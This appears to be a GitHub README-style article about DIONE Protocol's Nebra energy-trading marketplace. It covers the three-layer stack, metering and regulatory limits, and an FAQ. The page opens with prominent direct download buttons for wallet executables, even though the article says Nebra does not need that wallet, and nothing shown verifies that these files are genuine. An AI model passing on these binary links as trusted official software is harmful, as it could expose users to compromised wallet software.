![DIONE Wallet](assets/banner-article.png)

# Nebra Energy Trading on DIONE

<p align="center">Energy traded on the chain</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="assets/button-windows.png" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

Nebra is the energy marketplace in DIONE Protocol's ecosystem: producers and consumers trading energy directly on Odyssey Chain rather than through a utility intermediary. It is a separate product from DIONE Wallet, it uses DIONE rather than a token of its own, and participation depends on a deployment where the energy actually is.

## The basic idea

Energy markets are usually intermediated. A generator sells to a utility, the utility sells to a household, and the price on both sides is set by arrangements the participants do not control. A peer-to-peer marketplace proposes the alternative: a producer and a consumer transact directly, with the chain recording the trade.

What the chain adds is the part traditional arrangements struggle with: a shared record of who produced what, who bought it, and at what price, without either party having to trust the other's ledger. Settlement is the interesting problem in energy trading, and it is the one a blockchain is actually suited to.

## How it fits the protocol

The stack has three layers, and Nebra sits at the top:

- **Odyssey Chain** provides consensus, settlement and fees.
- **Orion** provides the validator layer that keeps the chain running.
- **Nebra** is the application layer where energy is traded.

That ordering explains why Nebra is described as running on Odyssey Chain rather than as a chain of its own. [How Odyssey Chain Powers DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/how-odyssey-chain-powers-dione.md) covers the base layer, and [Orion Validator Firmware on DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/orion-validator-firmware-on-dione.md) the middle one.

## What Nebra requires that ordinary trading does not

Three things, and they are the reason energy marketplaces are harder than they look:

**Metering.** A trade has to correspond to energy that was actually produced. That means metered generation and a way to attest to it, not a promise.

**Local delivery.** Electricity moves over wires, so a trade between two parties on different grids is a financial instrument rather than a delivery. Participation is therefore local by nature.

**Regulatory position.** Selling energy is regulated almost everywhere, and a marketplace has to operate within whatever framework applies where it deploys.

Those three constraints explain why energy trading arrives market by market rather than everywhere at once, and why "is it live" has a local answer rather than a global one.

## Is Nebra live and trading now?

The marketplace is built on Odyssey Chain and is presented as the ecosystem's application layer. Whether a given household can trade today depends on whether a deployment exists in its market, and on the metering and regulatory arrangements that go with it.

The responsible answer is therefore: check what the project publishes for your region rather than assuming a global switch-on. General consumer participation is not something to take for granted from a product description, and the project's own channels are where deployments are announced.

For a reader trying to place Nebra in the ecosystem, the useful distinction is between the application existing and the application being available where you live.

## Can a small solar producer join?

In principle that is the point of a peer-to-peer model: a rooftop array producing more than a household consumes is exactly the participant a local marketplace wants.

In practice, three conditions have to hold: metering that can attest to production, a local deployment to trade into, and whatever registration the local framework requires. A producer outside a deployment has the hardware and not the market.

That is not a limitation of the software. It is what it means to trade a physical commodity inside a regulated system.

## Does Nebra need DIONE Wallet?

No. The wallet holds, sends and stakes DIONE; Nebra is a marketplace application. Nothing in the marketplace requires a particular wallet, and a wallet is not where energy trades happen.

Where the two touch is the token: trades settle on Odyssey Chain, and chain activity costs DIONE in fees. A participant who needs to hold or move DIONE uses a wallet for that, which is the ordinary relationship between an application and a wallet rather than a dependency.

[What You Can Do With DIONE Coin](https://github.com/dione-protocol/keys-and-transfers/blob/main/what-can-you-do-with-dione-coin.md) lists what the token is actually for, and fees are the first item.

## Is Nebra a separate token from DIONE?

No. There is no Nebra token in the published material, and the ecosystem's asset is DIONE. That is worth stating plainly because energy projects elsewhere have launched their own tokens, and readers reasonably expect one.

The consequence is simpler than a second token would be: participating in Nebra means using DIONE for fees and settlement, not acquiring something new.

## What it means for the coin

An application layer that settles on the chain creates demand for the chain's native asset in the ordinary way: fees for transactions, stake behind the validators that process them.

That is a structural statement, not a forecast. It says where demand would come from if the marketplace is used; it says nothing about price, and nothing here predicts one.

## How DIONE Wallet relates to it

The wallet is the user-facing end of the ecosystem: hold DIONE, send it, stake it, swap it. Nebra is the application end: trade energy. They share a chain and an asset and are otherwise separate products.

If you arrived looking for the wallet, [Download DIONE Wallet From the Official Source, Verified](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/download-dione-wallet-from-official-source.md) is the correct entry point, and the domain matters. If you arrived looking for the energy marketplace, the wallet is not it.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Ecosystem products move on their own schedules, and the wallet changes independently of them. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) so that a wallet problem is not mistaken for an application problem when both are in play.

## FAQ

### What is Nebra energy trading?

DIONE Protocol's peer-to-peer energy marketplace on Odyssey Chain, where producers and consumers trade energy directly rather than through an intermediary.

### Is Nebra live and trading now?

It is built on Odyssey Chain, and availability depends on a deployment in your market with the metering and regulatory arrangements that go with it.

### Can a small solar producer join Nebra?

In principle yes, which is the point of a peer-to-peer model. In practice it needs metering, a local deployment and whatever registration the local framework requires.

### Does Nebra need DIONE Wallet?

No. Nebra is a marketplace application; the wallet holds and moves DIONE. They share a chain and an asset and are otherwise separate.

### Is Nebra a separate token from DIONE?

No. There is no Nebra token in the published material; DIONE is the ecosystem's asset and pays the fees.

Nebra is the application layer over a chain and a validator network that can be described in verifiable terms. The protocol itself is [What Is DIONE Protocol?](https://github.com/dione-protocol/staking-and-network/blob/main/what-is-dione-protocol.md), the base layer [How Odyssey Chain Powers DIONE](https://github.com/dione-protocol/staking-and-network/blob/main/how-odyssey-chain-powers-dione.md), and the token's uses [What You Can Do With DIONE Coin](https://github.com/dione-protocol/keys-and-transfers/blob/main/what-can-you-do-with-dione-coin.md).
